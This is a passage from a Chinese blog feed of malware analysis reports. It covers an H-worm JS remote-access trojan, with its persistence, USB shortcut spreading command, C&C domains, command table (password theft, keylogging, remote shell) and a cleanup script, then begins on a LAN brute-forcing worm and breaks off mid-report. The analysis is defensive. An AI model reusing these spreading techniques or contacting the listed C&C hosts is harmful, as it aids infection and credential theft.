color=red>upstart()</font>,修改注册表</p><p>HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run&lt;filename&gt;<br>HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run&lt;filename&gt;</p><p>并将自身文件拷贝到installdir目录下和开机自启动文件目录下，代码如下图：</p></li></ul><p>![1568871796431](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568871796431.png)</p><h4 id="感染可移动硬盘，实现传播"><a href="#感染可移动硬盘，实现传播" class="headerlink" title="感染可移动硬盘，实现传播"></a>感染可移动硬盘，实现传播</h4><p>函数<font color=red>install</font>，首先判断磁盘类型，当磁盘类型为可移动磁盘时，将自身复制到可移动磁盘中，并添加隐藏和系统属性，如图：</p><p>![1568872269934](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568872269934.png)然后再遍历所有文件，将所有文件属性设置为隐藏，并创建同名文件的快捷方式，该快捷方式执行命令为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe &#x2F;c start &lt;拷贝后的js文件(病毒文件本身)&gt; &amp; &lt;可移动磁盘中的原文件&gt; &amp; exit</span><br></pre></td></tr></table></figure><p>并通过查询注册表，获取文件的图标，将快捷方式的图标替换为文件原本图标。这样做的目的就是迷惑使用者打开伪装成正常文件的快捷方式，而该快捷方式会执行恶意程序，最终达到传播感染的目的。代码如图：</p><p>![1568873846687](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568873846687.png)</p><p>然后还遍历了所有文件夹，并执行了跟文件一样的操作，目的依旧是迷惑使用者运行恶意程序，最终实现通过可移动设备传播感染的目的。代码如图：</p><p>![1568873952855](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568873952855.png)</p><h4 id="向C-amp-C发送信息，并接受指令"><a href="#向C-amp-C发送信息，并接受指令" class="headerlink" title="向C&amp;C发送信息，并接受指令"></a>向C&amp;C发送信息，并接受指令</h4><p>函数<font color=red>post</font>,将获取到的<font color=red>主机信息</font>，发送到C&amp;C服务器，并返回接收到的指令。如图：</p><p>![1568874628464](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568874628464.png)</p><p>函数<font color=red>post</font>发送的数据的域名会根据函数的第一个参数，进行改变，如下图中post的 第一个参数为“is-ready”，那么该post发送数据的域名就为：unknownsoft.duckdns.org：7744/is-ready，也就是在行为分析中抓到的大量请求包的域名，可见行为分析图4。</p><p>![1568874790418](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568874790418.png)</p><ul><li><p>其中函数<font color=red>information</font>,会获取主机信息。获取的信息如下表:</p><table><thead><tr><th>获取的主机信息有：</th></tr></thead><tbody><tr><td>获取逻辑磁盘卷序列号信息</td></tr><tr><td>获取主机名信息</td></tr><tr><td>获取用户名信息</td></tr><tr><td>获取所含有的杀软信息</td></tr><tr><td>获取操作系统版本信息</td></tr></tbody></table></li></ul><p><font color=red>information</font>函数如下图：</p><p>![1568875219107](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568875219107.png)</p><h4 id="根据接收的指令，执行相应操作"><a href="#根据接收的指令，执行相应操作" class="headerlink" title="根据接收的指令，执行相应操作"></a>根据接收的指令，执行相应操作</h4><p>该样本不仅传播扩散自身，样本本身也是一个强大的远控木马。根据从C&amp;C服务器接收到的指令，执行相应的操作，如图：</p><p>![1568875879288](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568875879288.png)</p><p>其中所有的指令及功能都汇聚在下表中：</p><blockquote><table><thead><tr><th>接收到的指令</th><th>执行相应的操作</th></tr></thead><tbody><tr><td>disconnect</td><td>断开连接，关闭程序</td></tr><tr><td>reboot</td><td>重启操作系统</td></tr><tr><td>shutdown</td><td>关闭计算机</td></tr><tr><td>excecute</td><td>执行接收到的指令2</td></tr><tr><td>install-sdk</td><td>下载SDK文件，并解压</td></tr><tr><td>get-pass</td><td>获取浏览器密码，并解密后的密码发送到C&amp;C服务器</td></tr><tr><td>get-pass-offline</td><td>离线模式获取浏览器密码，大体与get-pass一样</td></tr><tr><td>update</td><td>更新&lt;installdir目录&gt;下的文件</td></tr><tr><td>uninstall</td><td>删除自身，清除所有远控木马程序的痕迹</td></tr><tr><td>up-n-exec</td><td>从C&amp;C服务器，下载文件，并执行</td></tr><tr><td>bring-log</td><td>将&lt;wshlogs\cmd[1]&gt;文件中保存的日志内容，发送到C&amp;C服务器</td></tr><tr><td>down-n-exec</td><td>从指定URL，下载文件，并执行</td></tr><tr><td>filemanager</td><td>从指定URL下载fm-plugin.exe，并运行</td></tr><tr><td>rdp</td><td>从指定URL下载rd-plugin.exe，并运行</td></tr><tr><td>keylogger</td><td>从指定URL下载kl-plugin.exe，并以参数为0运行</td></tr><tr><td>offline-keylogger</td><td>从指定URL下载kl-plugin.exe，并以参数为1运行</td></tr><tr><td>browse-logs</td><td>将&lt;installdir\wshlogs&gt;文件夹下的所有文件和文件夹信息发送到C&amp;C服务器</td></tr><tr><td>cmd-shell</td><td>执行接受到的DOS命令，并将执行结果发送到C&amp;C服务器</td></tr><tr><td>get-processes</td><td>将获取当前进程信息，发送到C&amp;C服务器</td></tr><tr><td>disable-uac</td><td>关闭UAC，并向C&amp;C服务器更新状态</td></tr><tr><td>check-eligible</td><td>检测指定文件是否存在，并向C&amp;C服务器更新状态</td></tr><tr><td>force-eligible</td><td>检测当前执行权限，可执行DOS命令，并向C&amp;C服务器更新状态</td></tr><tr><td>elevate</td><td>以管理员权限运行</td></tr><tr><td>if-elevate</td><td>判断执行参数中有无“elevated”，并将判断结果发往C&amp;C服务器</td></tr><tr><td>kill-process</td><td>根据接收到的PID，结束指定进程</td></tr><tr><td>sleep</td><td>根据接收到的值，进行睡眠</td></tr></tbody></table></blockquote><h1 id="0x02-样本溯源"><a href="#0x02-样本溯源" class="headerlink" title="0x02 样本溯源"></a>0x02 样本溯源</h1><table><thead><tr><th>C&amp;C服务器</th></tr></thead><tbody><tr><td>unknownsoft.duckdns.org：7744</td></tr><tr><td>globalization.duckdns.org：50071</td></tr></tbody></table><p>根据下图中的skype的信息，可以查找到该样本的相关信息，搜索结果与该样本大致一致。可知该样本是名为<font color=red>H-worm</font>的蠕虫病毒变种。</p><p>![1568880382170](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568880382170.png)</p><p>继续查<font color=red>H-Worm</font>,就能查到其他厂商相关的分析报告，可从中知该样本是基于VBS（Visual Basic Script）的Houdini蠕虫（H-Worm）的最新变种，其中Houdini蠕虫最初是在2013年开发和传播的。</p><p>![1568881017249](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568881017249.png)</p><p>链接为：<a href="http://www.mottoin.com/detail/4066.html">http://www.mottoin.com/detail/4066.html</a></p><h1 id="0x03-查杀方案"><a href="#0x03-查杀方案" class="headerlink" title="0x03 查杀方案"></a>0x03 查杀方案</h1><h2 id="利用自身脚本进行查杀"><a href="#利用自身脚本进行查杀" class="headerlink" title="利用自身脚本进行查杀"></a>利用自身脚本进行查杀</h2><p>由于该远控软件中有删除自身的功能，且删除自身还是比较干净，因此可以利用该代码进行查杀，代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uninstall</span>(<span class="params"></span>)                        //函数：卸载远控木马，清除所有远控木马程序的痕迹</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//|-------------------------------删除文件，删除自启动项-------------------------------------|</span></span><br><span class="line">        <span class="keyword">var</span> filename;</span><br><span class="line">        <span class="keyword">var</span> foldername;</span><br><span class="line">        <span class="keyword">try</span> </span><br><span class="line">        &#123;</span><br><span class="line">                                                <span class="comment">//删除注册表:HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\&lt;filename&gt; </span></span><br><span class="line">                                                <span class="comment">//删除注册表:HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\&lt;filename&gt;</span></span><br><span class="line">            WScript.Shell.RegDelete(<span class="string">&quot;HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run\\&quot;</span> + self_fileName.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]);</span><br><span class="line">            WScript.Shell.RegDelete(<span class="string">&quot;HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\run\\&quot;</span> + self_fileName.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ei) &#123;&#125;</span><br><span class="line">        <span class="keyword">try</span> </span><br><span class="line">        &#123;</span><br><span class="line">                                                <span class="comment">//删除自启动文件夹下的该文件</span></span><br><span class="line">            scripting.filesystemobject.deleteFile(startup + self_fileName, <span class="literal">true</span>);</span><br><span class="line">                                                <span class="comment">//删除正在运行的文件自身</span></span><br><span class="line">            scripting.filesystemobject.deleteFile(WScript.scriptFullName, <span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (eej) &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//|--------------------------------恢复移动硬盘文件-------------------------------------------|</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> dri = <span class="keyword">new</span> Enumerator(scripting.filesystemobject.drives); !dri.atEnd(); dri.moveNext()) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> drive = dri.item();</span><br><span class="line">            <span class="keyword">if</span> (drive.isready == <span class="literal">true</span>)          <span class="comment">//判断磁盘是否存在</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (drive.freespace &gt; <span class="number">0</span>)        <span class="comment">//判断磁盘可用空间大小是否大于0</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (drive.drivetype == <span class="number">1</span>)   <span class="comment">//判断是否是可移动磁盘</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">var</span> fi = <span class="keyword">new</span> Enumerator(scripting.filesystemobject.getfolder(drive.path + <span class="string">&quot;\\&quot;</span>).files); !fi.atEnd(); fi.moveNext()) </span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">var</span> file = fi.item();</span><br><span class="line">                            <span class="keyword">try</span> </span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="keyword">if</span> (file.name.indexOf(<span class="string">&quot;.&quot;</span>)) </span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="keyword">if</span> ((file.name.split(<span class="string">&quot;.&quot;</span>)[file.name.split(<span class="string">&quot;.&quot;</span>).length - <span class="number">1</span>]).toLowerCase() != <span class="string">&quot;lnk&quot;</span>) </span><br><span class="line">                                    &#123;</span><br><span class="line">                                        file.attributes = <span class="number">0</span>;</span><br><span class="line">                                        <span class="keyword">if</span> (file.name.toUpperCase() != self_fileName.toUpperCase()) </span><br><span class="line">                                        &#123;</span><br><span class="line">                                            filename = file.name.split(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">                                            scripting.filesystemobject.deleteFile(drive.path + <span class="string">&quot;\\&quot;</span> + filename[<span class="number">0</span>] + <span class="string">&quot;.lnk&quot;</span>); <span class="comment">//删除链接文件</span></span><br><span class="line">                                        &#125; </span><br><span class="line">                                        <span class="keyword">else</span> </span><br><span class="line">                                        &#123;</span><br><span class="line">                                            scripting.filesystemobject.deleteFile(drive.path + <span class="string">&quot;\\&quot;</span> + file.name); <span class="comment">//删除脚本文件</span></span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125; <span class="keyword">else</span> </span><br><span class="line">                                    &#123;</span><br><span class="line">                                        scripting.filesystemobject.deleteFile(file.path);       <span class="comment">//删除脚本文件</span></span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (ex) &#123;&#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">var</span> fi = <span class="keyword">new</span> Enumerator(scripting.filesystemobject.getfolder(drive.path + <span class="string">&quot;\\&quot;</span>).subFolders); !fi.atEnd(); fi.moveNext()) </span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">var</span> folder = fi.item();</span><br><span class="line">                            folder.attributes = <span class="number">0</span>;     <span class="comment">//还原文件属性</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;&#125;</span><br><span class="line">    WScript.quit();</span><br><span class="line">&#125;</span><br><span class="line">uninstall();</span><br></pre></td></tr></table></figure><p><strong>直接复制出来，保存到一个js文件，然后运行就可以进行查杀。</strong></p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><blockquote><p>该恶意样本是H-worm病毒的变种，是蠕虫病毒与远控木马的结合，伪装成.sct文件，进行传播。当该样本执行起来，会自动添加自启动项，感染可移动设备（可通过移动设备进行传播），并会从C&amp;C服务器上接收指令，执行不同的操作。该样本的远控功能完事，能够盗取受害者的网络浏览器和电子邮件客户端的密码、远程控制目标计算机、上传、下载执行文件以及执行远程脚本和命令等，同时它还具有键盘记录，对抗安全软件等多种功能。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远控 </tag>
            
            <tag> 奇兵计划 </tag>
            
            <tag> 样本分析报告 </tag>
            
            <tag> 非PE脚本语言样本 </tag>
            
            <tag> 蠕虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sample远控分析报告</title>
      <link href="2019/09/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/"/>
      <url>2019/09/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/</url>
      
        <content type="html"><![CDATA[<center><font size =8> <b>sample.exe分析报告</b></font></center><h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th align="center">样本名称</th><th align="center"><strong>sample.exe</strong></th></tr></thead><tbody><tr><td align="center"><strong>样本类型</strong></td><td align="center"><strong>远控、蠕虫病毒</strong></td></tr><tr><td align="center"><strong>样本大小</strong></td><td align="center"><strong>27.5KB（28,160字节）</strong></td></tr><tr><td align="center"><strong>MD5</strong></td><td align="center"><strong>4D049BC 19B03572EF8A00980050BAFFF</strong></td></tr></tbody></table><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>经过分析，该病毒样本是一个远控与蠕虫病毒的结合体，通过弱口令进行爆破局域网内的主机，进行传播。并通过访问两个C&amp;C服务器接收远程指令，根据接收到的指令执行不同的操作，包括：下载文件并执行，更新自身，DDOS等任务。</p></blockquote><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/sample.exe.png" alt="sample.exe"></p><h1 id="0x01-样本细节详细分析"><a href="#0x01-样本细节详细分析" class="headerlink" title="0x01 样本细节详细分析"></a>0x01 样本细节详细分析</h1><h2 id="样本行为分析"><a href="#样本行为分析" class="headerlink" title="样本行为分析"></a>样本行为分析</h2><h3 id="大量网络行为"><a href="#大量网络行为" class="headerlink" title="大量网络行为"></a>大量网络行为</h3><p>运行样本后， 该样本进行了大量的网络请求，其中不断尝试与内网IP地址<font color=red>192.168.1.107:83</font>进行连接。如图1</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568536102575.png" alt="1568536102575"></p><center>图1</center><p>然后通过fiddler抓取到，该样本访问<font color=red>异常URL，下载telnet.exe</font>。并且不断尝试与内网网段进行连接，如图2：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568537695315.png" alt="1568537695315"></p><center>图2</center><h2 id="样本详细分析"><a href="#样本详细分析" class="headerlink" title="样本详细分析"></a>样本详细分析</h2><h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><p>首先用查壳工具查下壳，发现该样本是<font color=red>UPX</font>壳。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568193338945.png" alt="1568193338945"></p><p>然后尝试用OD进行脱壳，F8单步执行一次，然后在ESP下硬件断点，F9运行到该硬件断点处，再单步几次就到了OEP处。然后dump下来，并用ImportREC工具修复IAT，但发现再该OEP处<font color=red>无法找到有用的信息</font>。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568193802608.png" alt="1568193802608"></p><p>这时再拿查壳工具查一下dump出来的文件，发现<font color=red>还有一层UPX壳</font>，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568195358436.png" alt="1568195358436"></p><p>所以目前的IAT表肯定是无法修复的，继续用OD单步跟，寻找下一个<font color=red>OEP</font>。单步几步就会发现，该壳程序通过<font color=red>LoadLibrary和GetProcAddress</font>获取了一些壳所需要的API，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568203038353.png" alt="1568203038353"></p><p>随后继续单步，发现该壳程序通过获取到的virtualAlloc开辟了一段空间，并往里存储了一些数据，然后将其全部释放掉了。这里我们不管，我们只寻找下一个<font color=red>pushad</font>。再走没几步，就发现了<font color=red>pushad</font>，这里再进行一次<font color=red>UPX脱壳</font>。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568203614365.png" alt="1568203614365"></p><p>然后继续单步，直到一个大跳便会跳到函数入口。出现如下图的55 8BEC。便可以dump下来，修复IAT表了。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568204331597.png" alt="1568204331597"></p><h3 id="创建互斥体"><a href="#创建互斥体" class="headerlink" title="创建互斥体"></a>创建互斥体</h3><p>先创建名为<font color=red>121212</font>的互斥体，然后进行判断，若互斥体存在，则退出当前进程。若不存在则执行主要行为函数<font color=red>sub_404BD7</font>。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568537469886.png" alt="1568537469886"></p><h3 id="创建服务"><a href="#创建服务" class="headerlink" title="创建服务"></a>创建服务</h3><p>创建一个名为<font color=red>.Net CLR</font>的服务，并设置该服务的状态。创建服务的目的可能是用来守护该进程。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568538257839.png" alt="1568538257839"></p><h3 id="再次创建互斥体"><a href="#再次创建互斥体" class="headerlink" title="再次创建互斥体"></a>再次创建互斥体</h3><p>再次创建名为<font color=red>.Net CLR</font>的互斥体，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568539531920.png" alt="1568539531920"></p><h3 id="枚举资源"><a href="#枚举资源" class="headerlink" title="枚举资源"></a>枚举资源</h3><p>通过调用上图中的<font color=red>EnumResourceNames</font>函数，枚举二进制模块中的资源，并将读取到的资源写入<font color=red>hra33.dll</font>中。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568540312153.png" alt="1568540312153"></p><h3 id="更新资源段"><a href="#更新资源段" class="headerlink" title="更新资源段"></a>更新资源段</h3><p>先检索注册表项<font color=red>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\.Net CLR</font>中的ImagePath的值。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568541164659.png" alt="1568541164659"></p><p>然后更新从ImagePath中获取的文件的资源段数据。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568541902631.png" alt="1568541902631"></p><h3 id="加载释放的文件"><a href="#加载释放的文件" class="headerlink" title="加载释放的文件"></a>加载释放的文件</h3><p>先拼接出<font color=red>hra33.dll</font>,再通过LoadLibrary加载该模块。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568545252074.png" alt="1568545252074"></p><h3 id="创建三个线程"><a href="#创建三个线程" class="headerlink" title="创建三个线程"></a>创建三个线程</h3><p>连续创建了3个线程，其中<font color=red>第三个线程是一个死循环</font>，不断创建执行线程3。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568547969803.png" alt="1568547969803"></p><h3 id="线程1：传播扩散"><a href="#线程1：传播扩散" class="headerlink" title="线程1：传播扩散"></a>线程1：传播扩散</h3><ul><li><p><strong>初始化字典</strong></p><p>首先初始化了一个简单的字典，后面用来弱口令爆破，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568548103805.png" alt="1568548103805"></p></li><li><p><strong>将主机号与网络号拼接成IP地址</strong></p><p>通过图中<font color=red>gethostbyname</font>函数获取当前主机的IP地址信息，然后获取当前主机IP地址的所处的网段信息<font color=red>（网络号）</font>，并与初始化的<font color=red>主机号：inc_IP_408724</font>进行拼接，将网络号与主机号进行拼接，IP地址：<font color=red>10.95.16.1</font>。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568548635418.png" alt="1568548635418"></p></li><li><p><strong>弱口令爆破该网段的所有主机</strong></p><p>利用如图黄色标识的<font color=red>主机号：inc_IP_408724</font>,然后与当前主机所在的网段<font color=red>（网络号）</font>拼接出的IP地址。通过调用如下图函数<font color=red>WNetAddCon_copy_exec_402A40</font>，利用之前初始话的字典，进行爆破传播。然后执行完一个IP后，主机号自加1，爆破该网段的下一个地址。直到主机号为254时停止。如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568549042369.png" alt="1568549042369"></p></li><li><p><strong>爆破传播函数<font color=red>WNetAddCon_copy_exec_402A40</font></strong></p><p><font 